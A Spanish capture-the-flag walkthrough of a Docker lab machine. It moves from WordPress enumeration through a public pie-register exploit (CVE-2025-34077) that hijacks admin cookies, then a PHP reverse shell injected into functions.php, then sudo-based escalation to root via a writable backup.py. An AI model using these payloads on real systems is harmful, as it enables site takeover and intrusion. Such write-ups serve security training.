## Reconocimiento:

Puerto 80 : HTTP

La web es un portal hecho con Wordpress, así que le hago un escaneo con wpscan:

```bash
wpscan --url URL --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

Encuentro un usuario llamado admin y un plugin vulnerable llamado pie-register v3.7.1.0. 

Buscando vulnerabilidades para la versión encuentro una: CVE-2025-34077 que permite “secuestrar” la sesión de administrador, obteniendo las cookies de autenticación del usuario admin.

```bash
git clone https://github.com/0xgh057r3c0n/CVE-2025-34077.git
cd CVE-2025-34077/
python3 CVE-2025-34077.py http://172.17.0.2/
```

Agregamos las cookies nuevas en la página y al volver a cargarla tendremos permisos de administrador.

Dentro hay que enviar una shell a la maquina host:

```bash
Tools -> Theme File Editor -> functions.php
```

En este archivo inyecto la rev shell:

```bash
$sock=fsockopen("172.17.0.1",4444);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Y con la opción “Update file” ya tenemos acceso.

## Escalada www-data → bobby

```bash
sudo -l
(bobby) NOPASSWD: /usr/bin/python3

ls -la /usr/bin/python3
```

Vemos que el binario no esta instalado. Para solucionarlo hay que manipular el Docker de la maquina vulnerable desde el host

```bash
sudo docker ps -a # Identificamos el tag del proceso docker
sudo docker exec -it <ID_DOCKER> bash -c "apt update && apt install python3 -y"
```

Ahora aprovechamos los permisos SUID para movernos a bobby:

```bash
sudo -u bobby /usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash")'
```

## Escalada Bobby - root

```bash
sudo -l 
(ALL) NOPASSWD: /usr/bin/python3 /opt/backup.py
```

El archivo implementa un sistema de backups que comprime diferentes directorios del sistema utilizando tar.gz

Analizando el entorno /opt me di cuenta que tiene permisos de escritura para cualquier usuario, así que el archivo [backup.py](http://backup.py) se puede modificar o reemplazar y será ejecutado como root.

Aprovechando esto, eliminaremos el script original y crearemos uno nuevo con el mismo nombre que nos otorgue una **shell como root**.

```bash
cat > /opt/backup.py << 'EOF'
import os
os.system('/bin/bash')
EOF
```

```bash
chmod +x /opt/backup.py
sudo python3 /opt/backup.py
```

Listo.
